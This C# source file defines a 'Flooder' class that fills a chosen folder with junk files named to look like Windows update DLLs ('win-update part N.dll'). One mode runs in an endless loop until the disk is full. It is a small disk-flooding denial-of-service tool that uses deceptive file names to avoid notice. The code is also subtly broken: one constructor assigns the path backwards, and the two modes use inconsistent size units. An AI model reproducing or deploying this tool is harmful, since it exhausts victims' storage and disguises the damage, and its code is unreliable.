using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlankFlooder
{
    class Flooder
    {
        private string path;
        private ulong count;
        private uint typeLoop; // 1 - infinite, 2 - limited
        private ulong fileSize;
        private static void AddText(FileStream stream, string value)
        {
            byte[] info = new UTF8Encoding(true).GetBytes(value);
            stream.Write(info, 0, info.Length);
        }


        /// <param name="size">In KiloBytes</param>
        public Flooder(string filePath, ulong size)
        {
            typeLoop = 1;
            fileSize = size;
            filePath = path;
        }

        /// <param name="size">In KiloBytes</param>
        public Flooder(string filePath, ulong sizeOfEachFile, uint filesCount)
        {
            typeLoop = 2;
            path = filePath;
            count = filesCount;
            fileSize = sizeOfEachFile;
            
        }


        public void Start()
        {
            if (typeLoop == 1)
            {
                ulong counter = 1;
                while (true)
                {
                    using (FileStream file = File.Create(path + "\\win-update part " + counter + ".dll"))
                    {
                        for (ulong symbol = 0; symbol < fileSize * 1024; symbol++)
                        {
                            AddText(file, "1");
                        }
                    }
                    counter++;
                }
            }
            if (typeLoop == 2)
            {
                for(ulong counter = 1; counter <= count; counter++)
                {
                    using (FileStream file = File.Create(path + "\\win-update part " + counter + ".dll"))
                    {
                        for (ulong symbol = 0; symbol < fileSize * 1024 * 1024; symbol++)
                        {
                            AddText(file, "1");
                        }
                    }
                }
            }
        }
    }
}
